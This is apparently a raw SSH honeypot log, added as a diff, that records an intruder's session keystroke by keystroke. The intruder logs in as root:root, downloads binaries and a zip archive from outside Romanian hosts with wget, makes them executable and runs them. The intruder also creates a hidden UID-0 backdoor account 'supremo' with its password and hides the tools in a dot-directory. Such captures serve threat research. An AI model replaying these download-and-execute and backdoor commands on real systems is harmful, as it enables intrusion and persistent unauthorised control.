@@ -1,0 +1,364 @@
+2019-11-14 05:48:48.275 - [Info] MITM Version: 1.26
+2019-11-14 05:48:48.282 - [Info] Auto Access Enabled: true
+2019-11-14 05:48:48.282 - [Debug] [Init] Auto Access Barrier: true
+2019-11-14 05:48:48.304 - [Info] SSH man-in-the-middle server for 172.20.0.3 listening on 0.0.0.0:10102
+2019-11-14 07:01:59.526 - [Debug] [Connection] Attacker connected: 86.120.244.1 | Client Identification: SSH-2.0-PuTTY_Release_0.70
+2019-11-14 07:02:02.334 - [Debug] [Auth] Attacker 86.120.244.1 trying to authenticate with "none"
+2019-11-14 07:02:02.336 - [Debug] [Auth] Attacker authentication error: No authentication method provided
+2019-11-14 07:02:03.805 - [Debug] [Auth] Attacker 86.120.244.1 trying to authenticate with "password"
+2019-11-14 07:02:03.806 - [Debug] [Auto Access] Attacker: 86.120.244.1, Threshold: 1, Attempts: 1
+2019-11-14 07:02:03.806 - [Debug] [Auto Access] Compromising the honeypot
+2019-11-14 07:02:03.806 - [Debug] [Auto Access] Adding the following credentials: "root:root"
+2019-11-14 07:02:03.949 - [Debug] [Auth] Valid credentials - Password Authentication
+2019-11-14 07:02:03.950 - [Debug] [LXC] Attempting to connect to the honeypot: 172.20.0.3
+2019-11-14 07:02:03.992 - [Debug] [LXC-Auth] Attacker authenticated and is inside container
+2019-11-14 07:02:04.866 - [Debug] [SHELL] Opened shell for attacker
+2019-11-14 07:02:06.669 - [Debug] [SHELL] Attacker Keystroke: w
+2019-11-14 07:02:06.884 - [Debug] [SHELL] Attacker Keystroke: g
+2019-11-14 07:02:06.972 - [Debug] [SHELL] Attacker Keystroke: e
+2019-11-14 07:02:07.092 - [Debug] [SHELL] Attacker Keystroke: t
+2019-11-14 07:02:07.220 - [Debug] [SHELL] Attacker Keystroke: [Space]
+2019-11-14 07:02:07.468 - [Debug] [SHELL] Attacker Keystroke: x
+2019-11-14 07:02:07.692 - [Debug] [SHELL] Attacker Keystroke: g
+2019-11-14 07:02:07.788 - [Debug] [SHELL] Attacker Keystroke: s
+2019-11-14 07:02:07.940 - [Debug] [SHELL] Attacker Keystroke: .
+2019-11-14 07:02:08.028 - [Debug] [SHELL] Attacker Keystroke: r
+2019-11-14 07:02:08.124 - [Debug] [SHELL] Attacker Keystroke: o
+2019-11-14 07:02:08.331 - [Debug] [SHELL] Attacker Keystroke: /
+2019-11-14 07:02:08.708 - [Debug] [SHELL] Attacker Keystroke: n
+2019-11-14 07:02:08.940 - [Debug] [SHELL] Attacker Keystroke: i
+2019-11-14 07:02:09.100 - [Debug] [SHELL] Attacker Keystroke: n
+2019-11-14 07:02:09.245 - [Debug] [SHELL] Attacker Keystroke: f
+2019-11-14 07:02:09.292 - [Debug] [SHELL] Attacker Keystroke: o
+2019-11-14 07:02:09.461 - [Debug] [SHELL] Attacker Keystroke: [CR]
+2019-11-14 07:02:09.465 - [Debug] [SHELL] line from reader: wget xgs.ro/ninfo
+2019-11-14 07:02:09.465 - [Debug] [SHELL] Keystroke buffer: 119,103,101,116,32,120,103,115,46,114,111,47,110,105,110,102,111,13
+2019-11-14 07:02:13.396 - [Debug] [SHELL] Attacker Keystroke: c
+2019-11-14 07:02:13.580 - [Debug] [SHELL] Attacker Keystroke: h
+2019-11-14 07:02:13.812 - [Debug] [SHELL] Attacker Keystroke: m
+2019-11-14 07:02:13.996 - [Debug] [SHELL] Attacker Keystroke: o
+2019-11-14 07:02:14.099 - [Debug] [SHELL] Attacker Keystroke: d
+2019-11-14 07:02:14.204 - [Debug] [SHELL] Attacker Keystroke: [Space]
+2019-11-14 07:02:14.428 - [Debug] [SHELL] Attacker Keystroke: 7
+2019-11-14 07:02:14.589 - [Debug] [SHELL] Attacker Keystroke: 7
+2019-11-14 07:02:14.788 - [Debug] [SHELL] Attacker Keystroke: 7
+2019-11-14 07:02:15.156 - [Debug] [SHELL] Attacker Keystroke: [Space]
+2019-11-14 07:02:15.356 - [Debug] [SHELL] Attacker Keystroke: n
+2019-11-14 07:02:15.588 - [Debug] [SHELL] Attacker Keystroke: i
+2019-11-14 07:02:15.780 - [Debug] [SHELL] Attacker Keystroke: n
+2019-11-14 07:02:15.900 - [Debug] [SHELL] Attacker Keystroke: f
+2019-11-14 07:02:15.972 - [Debug] [SHELL] Attacker Keystroke: o
+2019-11-14 07:02:16.148 - [Debug] [SHELL] Attacker Keystroke: [CR]
+2019-11-14 07:02:16.149 - [Debug] [SHELL] line from reader: chmod 777 ninfo
+2019-11-14 07:02:16.150 - [Debug] [SHELL] Keystroke buffer: 99,104,109,111,100,32,55,55,55,32,110,105,110,102,111,13
+2019-11-14 07:02:17.260 - [Debug] [SHELL] Attacker Keystroke: .
+2019-11-14 07:02:17.436 - [Debug] [SHELL] Attacker Keystroke: /
+2019-11-14 07:02:17.699 - [Debug] [SHELL] Attacker Keystroke: n
+2019-11-14 07:02:17.923 - [Debug] [SHELL] Attacker Keystroke: i
+2019-11-14 07:02:18.100 - [Debug] [SHELL] Attacker Keystroke: n
+2019-11-14 07:02:18.203 - [Debug] [SHELL] Attacker Keystroke: f
+2019-11-14 07:02:18.276 - [Debug] [SHELL] Attacker Keystroke: o
+2019-11-14 07:02:18.420 - [Debug] [SHELL] Attacker Keystroke: [CR]
+2019-11-14 07:02:18.421 - [Debug] [SHELL] line from reader: ./ninfo
+2019-11-14 07:02:18.421 - [Debug] [SHELL] Keystroke buffer: 46,47,110,105,110,102,111,13
+2019-11-14 07:03:58.274 - [Debug] [SHELL] Attacker Keystroke: [ETX]
+2019-11-14 07:04:52.560 - [Debug] [SHELL] Attacker Keystroke: w
+2019-11-14 07:04:52.847 - [Debug] [SHELL] Attacker Keystroke: g
+2019-11-14 07:04:53.872 - [Debug] [SHELL] Attacker Keystroke: e
+2019-11-14 07:04:53.991 - [Debug] [SHELL] Attacker Keystroke: t
+2019-11-14 07:04:55.079 - [Debug] [SHELL] Attacker Keystroke: [Space]
+2019-11-14 07:04:55.280 - [Debug] [SHELL] Attacker Keystroke: http://www.fanelishere.ro/arhive/info
+2019-11-14 07:04:55.976 - [Debug] [SHELL] Attacker Keystroke: [CR]
+2019-11-14 07:04:55.977 - [Debug] [SHELL] line from reader: wget http://www.fanelishere.ro/arhive/info
+2019-11-14 07:04:55.977 - [Debug] [SHELL] Keystroke buffer: 3,119,103,101,116,32,104,116,116,112,58,47,47,119,119,119,46,102,97,110,101,108,105,115,104,101,114,101,46,114,111,47,97,114,104,105,118,101,47,105,110,102,111,13
+2019-11-14 07:04:59.383 - [Debug] [SHELL] Attacker Keystroke: c
+2019-11-14 07:04:59.488 - [Debug] [SHELL] Attacker Keystroke: h
+2019-11-14 07:04:59.671 - [Debug] [SHELL] Attacker Keystroke: m
+2019-11-14 07:04:59.855 - [Debug] [SHELL] Attacker Keystroke: o
+2019-11-14 07:04:59.975 - [Debug] [SHELL] Attacker Keystroke: d
+2019-11-14 07:05:00.128 - [Debug] [SHELL] Attacker Keystroke: [Space]
+2019-11-14 07:05:00.295 - [Debug] [SHELL] Attacker Keystroke: 7
+2019-11-14 07:05:00.584 - [Debug] [SHELL] Attacker Keystroke: 7
+2019-11-14 07:05:00.975 - [Debug] [SHELL] Attacker Keystroke: [Space]
+2019-11-14 07:05:01.855 - [Debug] [SHELL] Attacker Keystroke: [DEL]
+2019-11-14 07:05:02.183 - [Debug] [SHELL] Attacker Keystroke: 7
+2019-11-14 07:05:02.473 - [Debug] [SHELL] Attacker Keystroke: [Space]
+2019-11-14 07:05:02.727 - [Debug] [SHELL] Attacker Keystroke: *
+2019-11-14 07:05:03.351 - [Debug] [SHELL] Attacker Keystroke: [CR]
+2019-11-14 07:05:03.352 - [Debug] [SHELL] line from reader: chmod 777 *
+2019-11-14 07:05:03.352 - [Debug] [SHELL] Keystroke buffer: 99,104,109,111,100,32,55,55,32,127,55,32,42,13
+2019-11-14 07:05:05.527 - [Debug] [SHELL] Attacker Keystroke: .
+2019-11-14 07:05:05.703 - [Debug] [SHELL] Attacker Keystroke: /
+2019-11-14 07:05:05.943 - [Debug] [SHELL] Attacker Keystroke: i
+2019-11-14 07:05:06.119 - [Debug] [SHELL] Attacker Keystroke: n
+2019-11-14 07:05:06.231 - [Debug] [SHELL] Attacker Keystroke: f
+2019-11-14 07:05:06.311 - [Debug] [SHELL] Attacker Keystroke: o
+2019-11-14 07:05:06.439 - [Debug] [SHELL] Attacker Keystroke: [CR]
+2019-11-14 07:05:06.440 - [Debug] [SHELL] line from reader: ./info
+2019-11-14 07:05:06.440 - [Debug] [SHELL] Keystroke buffer: 46,47,105,110,102,111,13
+2019-11-14 07:05:08.759 - [Debug] [SHELL] Attacker Keystroke: [ETX]
+2019-11-14 07:06:29.157 - [Debug] [SHELL] Attacker Keystroke: sudo[Space]useradd[Space]-ou[Space]0[Space]-g[Space]0[Space]supremo[CR]sudo[Space]passwd[Space]supremo
+2019-11-14 07:06:29.163 - [Debug] [SHELL] line from reader: sudo useradd -ou 0 -g 0 supremo
+2019-11-14 07:06:29.163 - [Debug] [SHELL] Keystroke buffer: 3,115,117,100,111,32,117,115,101,114,97,100,100,32,45,111,117,32,48,32,45,103,32,48,32,115,117,112,114,101,109,111,13,115,117,100,111,32,112,97,115,115,119,100,32,115,117,112,114,101,109,111
+2019-11-14 07:06:30.085 - [Debug] [SHELL] Attacker Keystroke: [CR]
+2019-11-14 07:06:30.086 - [Debug] [SHELL] line from reader: sudo passwd supremo
+2019-11-14 07:06:30.086 - [Debug] [SHELL] Keystroke buffer: 13
+2019-11-14 07:06:31.125 - [Debug] [SHELL] Attacker Keystroke: b
+2019-11-14 07:06:31.237 - [Debug] [SHELL] Attacker Keystroke: o
+2019-11-14 07:06:31.381 - [Debug] [SHELL] Attacker Keystroke: s
+2019-11-14 07:06:31.549 - [Debug] [SHELL] Attacker Keystroke: s
+2019-11-14 07:06:31.757 - [Debug] [SHELL] Attacker Keystroke: 3
+2019-11-14 07:06:31.829 - [Debug] [SHELL] Attacker Keystroke: 2
+2019-11-14 07:06:31.917 - [Debug] [SHELL] Attacker Keystroke: 1
+2019-11-14 07:06:32.173 - [Debug] [SHELL] Attacker Keystroke: b
+2019-11-14 07:06:32.301 - [Debug] [SHELL] Attacker Keystroke: o
+2019-11-14 07:06:32.429 - [Debug] [SHELL] Attacker Keystroke: s
+2019-11-14 07:06:32.597 - [Debug] [SHELL] Attacker Keystroke: s
+2019-11-14 07:06:32.821 - [Debug] [SHELL] Attacker Keystroke: 3
+2019-11-14 07:06:32.885 - [Debug] [SHELL] Attacker Keystroke: 2
+2019-11-14 07:06:32.973 - [Debug] [SHELL] Attacker Keystroke: 1
+2019-11-14 07:06:33.069 - [Debug] [SHELL] Attacker Keystroke: [CR]
+2019-11-14 07:06:33.070 - [Debug] [SHELL] line from reader: boss321boss321
+2019-11-14 07:06:33.070 - [Debug] [SHELL] Keystroke buffer: 98,111,115,115,51,50,49,98,111,115,115,51,50,49,13
+2019-11-14 07:06:33.949 - [Debug] [SHELL] Attacker Keystroke: b
+2019-11-14 07:06:34.075 - [Debug] [SHELL] Attacker Keystroke: o
+2019-11-14 07:06:34.222 - [Debug] [SHELL] Attacker Keystroke: s
+2019-11-14 07:06:34.390 - [Debug] [SHELL] Attacker Keystroke: s
+2019-11-14 07:06:34.629 - [Debug] [SHELL] Attacker Keystroke: 3
+2019-11-14 07:06:34.693 - [Debug] [SHELL] Attacker Keystroke: 2
+2019-11-14 07:06:34.790 - [Debug] [SHELL] Attacker Keystroke: 1
+2019-11-14 07:06:35.102 - [Debug] [SHELL] Attacker Keystroke: b
+2019-11-14 07:06:35.238 - [Debug] [SHELL] Attacker Keystroke: o
+2019-11-14 07:06:35.758 - [Debug] [SHELL] Attacker Keystroke: s
+2019-11-14 07:06:35.973 - [Debug] [SHELL] Attacker Keystroke: s
+2019-11-14 07:06:36.253 - [Debug] [SHELL] Attacker Keystroke: 3
+2019-11-14 07:06:36.333 - [Debug] [SHELL] Attacker Keystroke: 2
+2019-11-14 07:06:36.405 - [Debug] [SHELL] Attacker Keystroke: 1
+2019-11-14 07:06:36.566 - [Debug] [SHELL] Attacker Keystroke: [CR]
+2019-11-14 07:06:36.567 - [Debug] [SHELL] line from reader: boss321boss321
+2019-11-14 07:06:36.567 - [Debug] [SHELL] Keystroke buffer: 98,111,115,115,51,50,49,98,111,115,115,51,50,49,13
+2019-11-14 07:06:42.618 - [Debug] [SHELL] Attacker Keystroke: sudo[Space]usermod[Space]-a[Space]-G[Space]root[Space]supremo[CR]grep[Space]supremo[Space]/etc/passwd
+2019-11-14 07:06:42.620 - [Debug] [SHELL] line from reader: sudo usermod -a -G root supremo
+2019-11-14 07:06:42.620 - [Debug] [SHELL] Keystroke buffer: 115,117,100,111,32,117,115,101,114,109,111,100,32,45,97,32,45,71,32,114,111,111,116,32,115,117,112,114,101,109,111,13,103,114,101,112,32,115,117,112,114,101,109,111,32,47,101,116,99,47,112,97,115,115,119,100
+2019-11-14 07:06:43.309 - [Debug] [SHELL] Attacker Keystroke: [CR]
+2019-11-14 07:06:43.309 - [Debug] [SHELL] line from reader: grep supremo /etc/passwd
+2019-11-14 07:06:43.309 - [Debug] [SHELL] Keystroke buffer: 13
+2019-11-14 07:11:11.535 - [Debug] [SHELL] Attacker Keystroke: l
+2019-11-14 07:11:11.598 - [Debug] [SHELL] Attacker Keystroke: s
+2019-11-14 07:11:11.742 - [Debug] [SHELL] Attacker Keystroke: [CR]
+2019-11-14 07:11:11.743 - [Debug] [SHELL] line from reader: ls
+2019-11-14 07:11:11.744 - [Debug] [SHELL] Keystroke buffer: 108,115,13
+2019-11-14 07:11:12.239 - [Debug] [SHELL] Attacker Keystroke: r
+2019-11-14 07:11:12.350 - [Debug] [SHELL] Attacker Keystroke: m
+2019-11-14 07:11:12.526 - [Debug] [SHELL] Attacker Keystroke: [Space]
+2019-11-14 07:11:12.774 - [Debug] [SHELL] Attacker Keystroke: -
+2019-11-14 07:11:12.926 - [Debug] [SHELL] Attacker Keystroke: r
+2019-11-14 07:11:13.182 - [Debug] [SHELL] Attacker Keystroke: f
+2019-11-14 07:11:14.126 - [Debug] [SHELL] Attacker Keystroke: [Space]
+2019-11-14 07:11:14.414 - [Debug] [SHELL] Attacker Keystroke: n
+2019-11-14 07:11:14.718 - [Debug] [SHELL] Attacker Keystroke: i
+2019-11-14 07:11:14.918 - [Debug] [SHELL] Attacker Keystroke: n
+2019-11-14 07:11:15.006 - [Debug] [SHELL] Attacker Keystroke: f
+2019-11-14 07:11:15.102 - [Debug] [SHELL] Attacker Keystroke: o
+2019-11-14 07:11:15.262 - [Debug] [SHELL] Attacker Keystroke: [CR]
+2019-11-14 07:11:15.264 - [Debug] [SHELL] line from reader: rm -rf ninfo
+2019-11-14 07:11:15.264 - [Debug] [SHELL] Keystroke buffer: 114,109,32,45,114,102,32,110,105,110,102,111,13
+2019-11-14 07:11:15.750 - [Debug] [SHELL] Attacker Keystroke: r
+2019-11-14 07:11:15.846 - [Debug] [SHELL] Attacker Keystroke: m
+2019-11-14 07:11:16.006 - [Debug] [SHELL] Attacker Keystroke: [Space]
+2019-11-14 07:11:16.214 - [Debug] [SHELL] Attacker Keystroke: -
+2019-11-14 07:11:16.342 - [Debug] [SHELL] Attacker Keystroke: r
+2019-11-14 07:11:16.526 - [Debug] [SHELL] Attacker Keystroke: f
+2019-11-14 07:11:16.662 - [Debug] [SHELL] Attacker Keystroke: [Space]
+2019-11-14 07:11:16.966 - [Debug] [SHELL] Attacker Keystroke: i
+2019-11-14 07:11:17.142 - [Debug] [SHELL] Attacker Keystroke: n
+2019-11-14 07:11:17.302 - [Debug] [SHELL] Attacker Keystroke: f
+2019-11-14 07:11:17.391 - [Debug] [SHELL] Attacker Keystroke: o
+2019-11-14 07:11:17.558 - [Debug] [SHELL] Attacker Keystroke: [CR]
+2019-11-14 07:11:17.559 - [Debug] [SHELL] line from reader: rm -rf info
+2019-11-14 07:11:17.560 - [Debug] [SHELL] Keystroke buffer: 114,109,32,45,114,102,32,105,110,102,111,13
+2019-11-14 07:11:53.709 - [Debug] [SHELL] Attacker Keystroke: u
+2019-11-14 07:11:53.901 - [Debug] [SHELL] Attacker Keystroke: n
+2019-11-14 07:11:54.005 - [Debug] [SHELL] Attacker Keystroke: z
+2019-11-14 07:11:54.101 - [Debug] [SHELL] Attacker Keystroke: i
+2019-11-14 07:11:54.269 - [Debug] [SHELL] Attacker Keystroke: p
+2019-11-14 07:11:54.373 - [Debug] [SHELL] Attacker Keystroke: [CR]
+2019-11-14 07:11:54.374 - [Debug] [SHELL] line from reader: unzip
+2019-11-14 07:11:54.374 - [Debug] [SHELL] Keystroke buffer: 117,110,122,105,112,13
+2019-11-14 07:11:58.885 - [Debug] [SHELL] Attacker Keystroke: w
+2019-11-14 07:11:59.132 - [Debug] [SHELL] Attacker Keystroke: g
+2019-11-14 07:11:59.229 - [Debug] [SHELL] Attacker Keystroke: e
+2019-11-14 07:11:59.372 - [Debug] [SHELL] Attacker Keystroke: t
+2019-11-14 07:11:59.453 - [Debug] [SHELL] Attacker Keystroke: [Space]
+2019-11-14 07:11:59.765 - [Debug] [SHELL] Attacker Keystroke: http://www.fanelishere.ro/arhive/ozn.zip
+2019-11-14 07:12:00.372 - [Debug] [SHELL] Attacker Keystroke: [CR]
+2019-11-14 07:12:00.373 - [Debug] [SHELL] line from reader: wget http://www.fanelishere.ro/arhive/ozn.zip
+2019-11-14 07:12:00.373 - [Debug] [SHELL] Keystroke buffer: 119,103,101,116,32,104,116,116,112,58,47,47,119,119,119,46,102,97,110,101,108,105,115,104,101,114,101,46,114,111,47,97,114,104,105,118,101,47,111,122,110,46,122,105,112,13
+2019-11-14 07:12:11.317 - [Debug] [SHELL] Attacker Keystroke: u
+2019-11-14 07:12:11.500 - [Debug] [SHELL] Attacker Keystroke: n
+2019-11-14 07:12:11.604 - [Debug] [SHELL] Attacker Keystroke: z
+2019-11-14 07:12:11.708 - [Debug] [SHELL] Attacker Keystroke: i
+2019-11-14 07:12:11.893 - [Debug] [SHELL] Attacker Keystroke: p
+2019-11-14 07:12:12.085 - [Debug] [SHELL] Attacker Keystroke: [Space]
+2019-11-14 07:12:12.269 - [Debug] [SHELL] Attacker Keystroke: o
+2019-11-14 07:12:12.365 - [Debug] [SHELL] Attacker Keystroke: z
+2019-11-14 07:12:12.453 - [Debug] [SHELL] Attacker Keystroke: n
+2019-11-14 07:12:12.653 - [Debug] [SHELL] Attacker Keystroke: .
+2019-11-14 07:12:12.820 - [Debug] [SHELL] Attacker Keystroke: z
+2019-11-14 07:12:12.924 - [Debug] [SHELL] Attacker Keystroke: i
+2019-11-14 07:12:13.108 - [Debug] [SHELL] Attacker Keystroke: p
+2019-11-14 07:12:13.221 - [Debug] [SHELL] Attacker Keystroke: [CR]
+2019-11-14 07:12:13.222 - [Debug] [SHELL] line from reader: unzip ozn.zip
+2019-11-14 07:12:13.222 - [Debug] [SHELL] Keystroke buffer: 117,110,122,105,112,32,111,122,110,46,122,105,112,13
+2019-11-14 07:12:14.852 - [Debug] [SHELL] Attacker Keystroke: r
+2019-11-14 07:12:14.868 - [Debug] [SHELL] Attacker Keystroke: m
+2019-11-14 07:12:15.044 - [Debug] [SHELL] Attacker Keystroke: [Space]
+2019-11-14 07:12:15.940 - [Debug] [SHELL] Attacker Keystroke: -
+2019-11-14 07:12:16.076 - [Debug] [SHELL] Attacker Keystroke: r
+2019-11-14 07:12:16.268 - [Debug] [SHELL] Attacker Keystroke: f
+2019-11-14 07:12:16.412 - [Debug] [SHELL] Attacker Keystroke: [Space]
+2019-11-14 07:12:16.796 - [Debug] [SHELL] Attacker Keystroke: o
+2019-11-14 07:12:16.884 - [Debug] [SHELL] Attacker Keystroke: z
+2019-11-14 07:12:17.004 - [Debug] [SHELL] Attacker Keystroke: n
+2019-11-14 07:12:17.212 - [Debug] [SHELL] Attacker Keystroke: .
+2019-11-14 07:12:17.356 - [Debug] [SHELL] Attacker Keystroke: z
+2019-11-14 07:12:17.460 - [Debug] [SHELL] Attacker Keystroke: i
+2019-11-14 07:12:17.628 - [Debug] [SHELL] Attacker Keystroke: p
+2019-11-14 07:12:17.732 - [Debug] [SHELL] Attacker Keystroke: [CR]
+2019-11-14 07:12:17.733 - [Debug] [SHELL] line from reader: rm -rf ozn.zip
+2019-11-14 07:12:17.733 - [Debug] [SHELL] Keystroke buffer: 114,109,32,45,114,102,32,111,122,110,46,122,105,112,13
+2019-11-14 07:12:18.372 - [Debug] [SHELL] Attacker Keystroke: m
+2019-11-14 07:12:18.484 - [Debug] [SHELL] Attacker Keystroke: v
+2019-11-14 07:12:18.588 - [Debug] [SHELL] Attacker Keystroke: [Space]
+2019-11-14 07:12:18.844 - [Debug] [SHELL] Attacker Keystroke: o
+2019-11-14 07:12:18.964 - [Debug] [SHELL] Attacker Keystroke: z
+2019-11-14 07:12:19.084 - [Debug] [SHELL] Attacker Keystroke: n
+2019-11-14 07:12:19.276 - [Debug] [SHELL] Attacker Keystroke: [Space]
+2019-11-14 07:12:19.604 - [Debug] [SHELL] Attacker Keystroke: .
+2019-11-14 07:12:19.820 - [Debug] [SHELL] Attacker Keystroke: o
+2019-11-14 07:12:19.924 - [Debug] [SHELL] Attacker Keystroke: z
+2019-11-14 07:12:20.044 - [Debug] [SHELL] Attacker Keystroke: n
+2019-11-14 07:12:20.252 - [Debug] [SHELL] Attacker Keystroke: [CR]
+2019-11-14 07:12:20.253 - [Debug] [SHELL] line from reader: mv ozn .ozn
+2019-11-14 07:12:20.253 - [Debug] [SHELL] Keystroke buffer: 109,118,32,111,122,110,32,46,111,122,110,13
+2019-11-14 07:12:21.581 - [Debug] [SHELL] Attacker Keystroke: c
+2019-11-14 07:12:21.660 - [Debug] [SHELL] Attacker Keystroke: d
+2019-11-14 07:12:21.821 - [Debug] [SHELL] Attacker Keystroke: [Space]
+2019-11-14 07:12:21.981 - [Debug] [SHELL] Attacker Keystroke: o
+2019-11-14 07:12:22.388 - [Debug] [SHELL] Attacker Keystroke: [DEL]
+2019-11-14 07:12:22.620 - [Debug] [SHELL] Attacker Keystroke: .
+2019-11-14 07:12:22.844 - [Debug] [SHELL] Attacker Keystroke: o
+2019-11-14 07:12:22.980 - [Debug] [SHELL] Attacker Keystroke: z
+2019-11-14 07:12:23.084 - [Debug] [SHELL] Attacker Keystroke: n
+2019-11-14 07:12:23.284 - [Debug] [SHELL] Attacker Keystroke: [CR]
+2019-11-14 07:12:23.285 - [Debug] [SHELL] line from reader: cd .ozn
+2019-11-14 07:12:23.285 - [Debug] [SHELL] Keystroke buffer: 99,100,32,111,127,46,111,122,110,13
+2019-11-14 07:12:24.692 - [Debug] [SHELL] Attacker Keystroke: n
+2019-11-14 07:12:24.788 - [Debug] [SHELL] Attacker Keystroke: a
+2019-11-14 07:12:24.860 - [Debug] [SHELL] Attacker Keystroke: n
+2019-11-14 07:12:25.044 - [Debug] [SHELL] Attacker Keystroke: o
+2019-11-14 07:12:25.221 - [Debug] [SHELL] Attacker Keystroke: [Space]
+2019-11-14 07:12:25.340 - [Debug] [SHELL] Attacker Keystroke: d
+2019-11-14 07:12:25.444 - [Debug] [SHELL] Attacker Keystroke: o
+2019-11-14 07:12:25.604 - [Debug] [SHELL] Attacker Keystroke: n
+2019-11-14 07:12:26.076 - [Debug] [SHELL] Attacker Keystroke: [CR]
+2019-11-14 07:12:26.077 - [Debug] [SHELL] line from reader: nano don
+2019-11-14 07:12:26.077 - [Debug] [SHELL] Keystroke buffer: 110,97,110,111,32,100,111,110,13
+2019-11-14 07:12:27.620 - [Debug] [SHELL] Attacker Keystroke: [ESC]OB
+2019-11-14 07:12:27.788 - [Debug] [SHELL] Attacker Keystroke: [ESC]OB
+2019-11-14 07:12:28.332 - [Debug] [SHELL] Attacker Keystroke: [ESC]OB
+2019-11-14 07:12:28.580 - [Debug] [SHELL] Attacker Keystroke: [ESC]OB
+2019-11-14 07:12:28.940 - [Debug] [SHELL] Attacker Keystroke: [ESC]OC
+2019-11-14 07:12:29.140 - [Debug] [SHELL] Attacker Keystroke: [ESC]OC
+2019-11-14 07:12:29.324 - [Debug] [SHELL] Attacker Keystroke: [ESC]OC
+2019-11-14 07:12:29.468 - [Debug] [SHELL] Attacker Keystroke: [ESC]OC
+2019-11-14 07:12:29.980 - [Debug] [SHELL] Attacker Keystroke: [ESC]OC
+2019-11-14 07:12:30.437 - [Debug] [SHELL] Attacker Keystroke: 2
+2019-11-14 07:12:30.828 - [Debug] [SHELL] Attacker Keystroke: 3
+2019-11-14 07:12:31.676 - [Debug] [SHELL] Attacker Keystroke: [ETX]
+2019-11-14 07:12:31.942 - [Debug] [SHELL] Attacker Keystroke: [CAN]
+2019-11-14 07:12:32.909 - [Debug] [SHELL] Attacker Keystroke: y
+2019-11-14 07:12:33.836 - [Debug] [SHELL] Attacker Keystroke: [CR]
+2019-11-14 07:12:33.837 - [Debug] [SHELL] line from reader: 23y
+2019-11-14 07:12:33.837 - [Debug] [SHELL] Keystroke buffer: 27,79,66,27,79,66,27,79,66,27,79,66,27,79,67,27,79,67,27,79,67,27,79,67,27,79,67,50,51,3,24,121,13
+2019-11-14 07:12:34.556 - [Debug] [SHELL] Attacker Keystroke: s
+2019-11-14 07:12:34.723 - [Debug] [SHELL] Attacker Keystroke: c
+2019-11-14 07:12:34.908 - [Debug] [SHELL] Attacker Keystroke: r
+2019-11-14 07:12:35.004 - [Debug] [SHELL] Attacker Keystroke: e
+2019-11-14 07:12:35.148 - [Debug] [SHELL] Attacker Keystroke: e
+2019-11-14 07:12:35.260 - [Debug] [SHELL] Attacker Keystroke: n
+2019-11-14 07:12:35.444 - [Debug] [SHELL] Attacker Keystroke: [Space]
+2019-11-14 07:12:36.091 - [Debug] [SHELL] Attacker Keystroke: -
+2019-11-14 07:12:37.155 - [Debug] [SHELL] Attacker Keystroke: S
+2019-11-14 07:12:37.588 - [Debug] [SHELL] Attacker Keystroke: [Space]
+2019-11-14 07:12:38.091 - [Debug] [SHELL] Attacker Keystroke: o
+2019-11-14 07:12:38.228 - [Debug] [SHELL] Attacker Keystroke: z
+2019-11-14 07:12:38.324 - [Debug] [SHELL] Attacker Keystroke: n
+2019-11-14 07:12:38.955 - [Debug] [SHELL] Attacker Keystroke: [CR]
+2019-11-14 07:12:38.956 - [Debug] [SHELL] line from reader: screen -S ozn
+2019-11-14 07:12:38.956 - [Debug] [SHELL] Keystroke buffer: 115,99,114,101,101,110,32,45,83,32,111,122,110,13
+2019-11-14 07:12:41.884 - [Debug] [SHELL] Attacker Keystroke: a
+2019-11-14 07:12:42.004 - [Debug] [SHELL] Attacker Keystroke: p
+2019-11-14 07:12:42.107 - [Debug] [SHELL] Attacker Keystroke: t
+2019-11-14 07:12:42.412 - [Debug] [SHELL] Attacker Keystroke: [Space]
+2019-11-14 07:12:42.604 - [Debug] [SHELL] Attacker Keystroke: i
+2019-11-14 07:12:42.748 - [Debug] [SHELL] Attacker Keystroke: n
+2019-11-14 07:12:42.876 - [Debug] [SHELL] Attacker Keystroke: s
+2019-11-14 07:12:42.899 - [Debug] [SHELL] Attacker Keystroke: t
+2019-11-14 07:12:42.988 - [Debug] [SHELL] Attacker Keystroke: a
+2019-11-14 07:12:43.060 - [Debug] [SHELL] Attacker Keystroke: l
+2019-11-14 07:12:43.204 - [Debug] [SHELL] Attacker Keystroke: l
+2019-11-14 07:12:43.388 - [Debug] [SHELL] Attacker Keystroke: [Space]
+2019-11-14 07:12:43.476 - [Debug] [SHELL] Attacker Keystroke: s
+2019-11-14 07:12:43.636 - [Debug] [SHELL] Attacker Keystroke: c
+2019-11-14 07:12:43.820 - [Debug] [SHELL] Attacker Keystroke: r
+2019-11-14 07:12:43.908 - [Debug] [SHELL] Attacker Keystroke: e
+2019-11-14 07:12:44.068 - [Debug] [SHELL] Attacker Keystroke: e
+2019-11-14 07:12:44.196 - [Debug] [SHELL] Attacker Keystroke: n
+2019-11-14 07:12:44.380 - [Debug] [SHELL] Attacker Keystroke: [CR]
+2019-11-14 07:12:44.381 - [Debug] [SHELL] line from reader: apt install screen
+2019-11-14 07:12:44.381 - [Debug] [SHELL] Keystroke buffer: 97,112,116,32,105,110,115,116,97,108,108,32,115,99,114,101,101,110,13
+2019-11-14 07:12:48.052 - [Debug] [SHELL] Attacker Keystroke: y
+2019-11-14 07:12:48.188 - [Debug] [SHELL] Attacker Keystroke: [CR]
+2019-11-14 07:12:48.189 - [Debug] [SHELL] line from reader: y
+2019-11-14 07:12:48.189 - [Debug] [SHELL] Keystroke buffer: 121,13
+2019-11-14 07:13:00.124 - [Debug] [SHELL] Attacker Keystroke: [ESC][A
+2019-11-14 07:13:00.835 - [Debug] [SHELL] Attacker Keystroke: [ESC][A
+2019-11-14 07:13:01.611 - [Debug] [SHELL] Attacker Keystroke: [CR]
+2019-11-14 07:13:01.616 - [Debug] [SHELL] line from reader: apt install screen
+2019-11-14 07:13:01.617 - [Debug] [SHELL] Keystroke buffer: 27,91,65,27,91,65,13
+2019-11-14 07:13:03.179 - [Debug] [SHELL] Attacker Keystroke: .
+2019-11-14 07:13:03.332 - [Debug] [SHELL] Attacker Keystroke: /
+2019-11-14 07:13:03.484 - [Debug] [SHELL] Attacker Keystroke: d
+2019-11-14 07:13:03.571 - [Debug] [SHELL] Attacker Keystroke: o
+2019-11-14 07:13:03.764 - [Debug] [SHELL] Attacker Keystroke: n
+2019-11-14 07:13:05.451 - [Debug] [SHELL] Attacker Keystroke: [CR]
+2019-11-14 07:13:05.452 - [Debug] [SHELL] line from reader: ./don
+2019-11-14 07:13:05.452 - [Debug] [SHELL] Keystroke buffer: 46,47,100,111,110,13
+2019-11-14 07:13:08.811 - [Debug] [SHELL] Attacker Keystroke: c
